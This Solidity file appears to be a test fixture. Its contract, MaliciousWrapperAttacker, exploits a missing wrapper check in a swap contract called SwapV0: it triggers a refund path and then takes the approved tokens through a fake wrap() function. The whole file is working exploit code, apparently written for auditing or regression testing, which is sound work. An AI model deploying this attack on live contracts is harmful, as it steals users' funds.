// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IWrapperReceiver} from "../interfaces/IWrapperReceiver.sol";
import {SwapData} from "../swap/swap_v0.sol";

/// @title MockConfidentialToken
/// @notice Mock confidential token that only implements nextTxId for testing
contract MockConfidentialToken {
    uint256 public nextTxId = 1;
}

/// @title MaliciousWrapperAttacker
/// @notice Demonstrates the wrapper verification bypass attack
/// @dev This contract exploits the vulnerability where SwapV0 doesn't verify msg.sender
///      is a legitimate wrapper before processing refunds
contract MaliciousWrapperAttacker {
    using SafeERC20 for IERC20;

    address public immutable targetToken;
    address public immutable swapV0Address;
    address public owner;
    MockConfidentialToken public mockCToken;

    // Track stolen tokens
    uint256 public stolenAmount;

    constructor(address targetToken_, address swapV0_) {
        targetToken = targetToken_;
        swapV0Address = swapV0_;
        owner = msg.sender;
        mockCToken = new MockConfidentialToken();
    }

    /// @notice Returns the token this "wrapper" claims to wrap
    /// @dev This is called by SwapV0.checkPath and SwapV0._refundUser
    function originalToken() external view returns (address) {
        return targetToken;
    }

    /// @notice Returns a mock confidential token
    /// @dev Required for _refundUser to call confidentialToken().nextTxId()
    function confidentialToken() external view returns (MockConfidentialToken) {
        return mockCToken;
    }

    /// @notice Malicious wrap function that steals approved tokens
    /// @dev This is called by SwapV0._refundUser after it approves tokens to this contract
    /// @param /* to */ Ignored
    /// @param /* amount */ Ignored
    function wrap(address /* to */, uint256 /* amount */) external {
        // Steal all approved tokens
        uint256 allowance = IERC20(targetToken).allowance(swapV0Address, address(this));
        if (allowance > 0) {
            IERC20(targetToken).safeTransferFrom(swapV0Address, owner, allowance);
            stolenAmount += allowance;
        }
    }

    /// @notice Initiates the attack by calling SwapV0.onUnwrapFinalizedReceived
    /// @dev The attack works by:
    ///      1. Providing a path where path[0] != originalToken() to trigger checkPath failure
    ///      2. checkPath returns false BEFORE verifying wrapper legitimacy
    ///      3. SwapV0 calls _refundUser, which trusts msg.sender and approves tokens
    ///      4. Our malicious wrap() function steals the approved tokens
    function executeAttack(
        uint256 amountIn,
        address router,
        address[] memory pathWithWrongFirstToken
    ) external {
        // Prepare swap data with invalid path (path[0] != targetToken)
        // This will cause checkPath to return false before wrapper validation
        SwapData memory swapData = SwapData({
            routerAddress: router,
            amountOutMin: 0,
            path: pathWithWrongFirstToken,
            deadline: block.timestamp + 1000,
            to: owner
        });

        bytes memory data = abi.encode(swapData);

        // Call SwapV0's callback function directly
        // Without proper msg.sender validation, SwapV0 will:
        // 1. Call checkPath → returns false (path mismatch)
        // 2. Call _refundUser → approves tokens to us and calls our wrap()
        // 3. Our wrap() steals the tokens
        IWrapperReceiver(swapV0Address).onUnwrapFinalizedReceived(
            msg.sender,
            amountIn,
            0, // unwrapRequestId
            owner, // refundTo
            data
        );
    }

    /// @notice Allows owner to withdraw stolen tokens
    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = IERC20(targetToken).balanceOf(address(this));
        if (balance > 0) {
            IERC20(targetToken).safeTransfer(owner, balance);
        }
    }
}
